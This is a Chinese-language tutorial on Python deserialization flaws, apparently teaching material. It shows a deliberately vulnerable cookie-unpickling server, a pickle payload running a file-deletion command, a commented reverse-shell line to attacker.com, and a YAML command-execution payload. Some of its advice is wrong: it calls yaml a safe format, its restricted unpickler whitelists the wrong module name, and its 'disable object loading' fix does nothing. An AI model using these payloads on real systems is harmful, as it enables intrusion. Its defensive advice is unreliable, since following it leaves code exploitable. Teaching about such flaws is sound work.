
## Basic 反序列化
- Sink: `pickle.loads` / `yaml.load(`
```python
# 导入所需模块
from http.server import BaseHTTPRequestHandler, HTTPServer  # 基础HTTP服务器模块
from http.cookies import SimpleCookie  # Cookie处理模块
import base64  # Base64编解码模块
import pickle  # Python对象序列化模块（存在安全风险）

class MyServer(BaseHTTPRequestHandler):
    """自定义HTTP请求处理器"""
    
    def do_GET(self):
        """处理GET请求的方法"""
        
        # 从请求头中获取Cookie
        cookies = SimpleCookie(self.headers.get('Cookie'))
        
        # 尝试从Cookie中获取用户名
        if cookies.get('username'):
            # 【严重安全漏洞】从Cookie中反序列化用户名
            # 步骤：Base64解码 -> pickle反序列化
            # 攻击者可以构造恶意的pickle数据执行任意代码
            username = pickle.loads(base64.b64decode(cookies.get('username').value))
        else:
            # 默认用户名
            username = 'stranger'
        
        # 发送HTTP响应头
        self.send_response(200)  # 状态码200（成功）
        self.send_header("Content-type", "text/html")  # 内容类型为HTML
        self.end_headers()  # 结束头部
        
        # 构建并发送HTML响应
        self.wfile.write(bytes("<html><head><title>Hello</title></head>", "utf-8"))
        self.wfile.write(bytes("<body>", "utf-8"))
        self.wfile.write(bytes("<h1>Hello %s</h1>" % username, "utf-8"))
        self.wfile.write(bytes("</body></html>", "utf-8"))

if __name__ == "__main__":
    # 创建HTTP服务器实例
    # 监听所有网络接口（0.0.0.0）的1337端口
    webServer = HTTPServer(('0.0.0.0', 1337), MyServer)
    
    # 安全警告：0.0.0.0表示监听所有接口，包括公网IP
    # 应在生产环境中谨慎使用，建议限制为127.0.0.1或特定IP
    
    try:
        print("服务器启动，监听端口1337...")
        webServer.serve_forever()  # 启动服务器，持续处理请求
    except KeyboardInterrupt:
        # 捕获Ctrl+C中断信号
        pass
    
    webServer.server_close()  # 关闭服务器
    print("服务器已停止。")
```

## Python常见反序列化漏洞

### 1. **Pickle反序列化漏洞**

#### 漏洞原理

`pickle`模块是Python的原生序列化模块，其设计**并非安全的数据交换格式**。反序列化过程中会自动执行对象的`__reduce__()`方法，攻击者可构造恶意对象实现远程代码执行。

#### 攻击示例

```python
import pickle
import base64
import os

# 构造恶意payload
class EvilPayload:
    def __reduce__(self):
        # 任意系统命令执行
        return (os.system, ('rm -rf /tmp/test',))  # 危险：删除文件
        # 或反弹shell: ('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"',)

# 生成恶意cookie值
malicious_cookie = base64.b64encode(pickle.dumps(EvilPayload())).decode()
print(f"恶意Cookie值: {malicious_cookie}")
```

#### 防护措施

1. **绝不反序列化不受信数据**
2. 使用`json`、`yaml`等安全格式替代
3. 如需使用pickle，设置`pickle.Unpickler`的`find_class`限制

```python
import pickle

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        # 只允许基本模块
        allowed = {'__builtins__': ['str', 'int', 'list', 'dict']}
        if module in allowed and name in allowed[module]:
            return super().find_class(module, name)
        raise pickle.UnpicklingError(f"禁止导入 {module}.{name}")
```

### 2. **YAML反序列化漏洞**

#### 漏洞原理

PyYAML的`yaml.load()`默认使用不安全的`FullLoader`，允许执行任意Python代码。

#### 危险示例

```python
import yaml

# 恶意YAML数据
evil_yaml = """
!!python/object/apply:os.system ["echo 漏洞利用成功"]
"""

# 不安全的反序列化
result = yaml.load(evil_yaml, Loader=yaml.FullLoader)  # 执行系统命令
```

#### 安全用法

```python
import yaml

# 安全方式：使用SafeLoader
data = yaml.load(yaml_string, Loader=yaml.SafeLoader)  # 仅加载基本数据类型

# 或完全禁用对象加载
yaml.YAMLObject.__reduce__ = None
```

### 3. **JSON反序列化漏洞**

#### 相对安全但需注意

JSON本身是安全的序列化格式，但不当使用仍存在问题：

1. **eval()滥用**（反模式）
```python
import json

# ❌ 危险：使用eval解析JSON
data = eval(json_string)  # 如json_string为"__import__('os').system('calc')"将执行命令

# ✅ 安全：使用json.loads()
data = json.loads(json_string)  # 安全，只能解析基本数据类型
```

1. **复杂对象序列化漏洞**
```python
import json

class User:
    def __init__(self, name):
        self.name = name
    
    def __dict__(self):
        return {'name': self.name}

# 自定义编码器可能引入漏洞
class VulnerableEncoder(json.JSONEncoder):
    def default(self, obj):
        if isinstance(obj, User):
            return obj.__dict__()  # 如果__dict__被覆盖可能有问题
        return super().default(obj)
```
